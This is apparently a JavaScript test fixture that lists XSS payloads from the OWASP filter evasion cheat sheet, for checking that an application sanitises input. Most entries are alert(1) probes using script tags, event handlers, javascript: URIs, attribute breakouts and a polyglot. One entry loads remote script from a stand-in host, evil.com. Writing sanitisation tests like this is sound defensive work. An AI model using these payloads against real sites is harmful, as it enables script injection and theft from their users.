/**
 * XSS Test Payloads
 * Based on OWASP XSS Filter Evasion Cheat Sheet
 * https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 */

const xssPayloads = {
  // Basic script injection
  basic: [
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script src="http://evil.com/xss.js"></script>',
  ],

  // Image-based XSS
  imgBased: [
    '<img src="x" onerror="alert(1)">',
    '<img src=x onerror=alert(1)>',
    '<img/src="x"onerror="alert(1)">',
    '<img src="javascript:alert(1)">',
  ],

  // SVG-based XSS
  svgBased: [
    '<svg onload="alert(1)">',
    '<svg/onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
  ],

  // Event handler-based XSS
  // Note: Some elements like <body>, <marquee>, <details> may not be properly
  // rendered by test frameworks like JSDOM when inserted via innerHTML
  eventHandlers: [
    '<div onmouseover="alert(1)">hover me</div>',
    '<input onfocus="alert(1)" autofocus>',
    '<video><source onerror="alert(1)">',
    '<img src=x onmouseover="alert(1)">',
  ],

  // Link-based XSS
  linkBased: [
    '<a href="javascript:alert(1)">click</a>',
    '<a href="data:text/html,<script>alert(1)</script>">click</a>',
  ],

  // iframe-based XSS
  iframeBased: [
    '<iframe src="javascript:alert(1)">',
    '<iframe srcdoc="<script>alert(1)</script>">',
  ],

  // Encoded payloads
  encoded: [
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
  ],

  // Breaking out of attributes
  attributeBreakout: [
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '" onfocus="alert(1)" autofocus="',
    "' onclick='alert(1)' '",
  ],

  // Polyglot payloads (work in multiple contexts)
  polyglot: [
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
  ],
};

// Flatten all payloads into a single array
const allPayloads = Object.values(xssPayloads).flat();

// Payloads that should trigger script execution if vulnerable
const executionPayloads = [
  ...xssPayloads.basic,
  ...xssPayloads.imgBased,
  ...xssPayloads.svgBased,
  ...xssPayloads.eventHandlers,
];

// Safe payloads for testing sanitization (should be escaped, not executed)
const sanitizationTestPayloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
];

module.exports = {
  xssPayloads,
  allPayloads,
  executionPayloads,
  sanitizationTestPayloads,
};
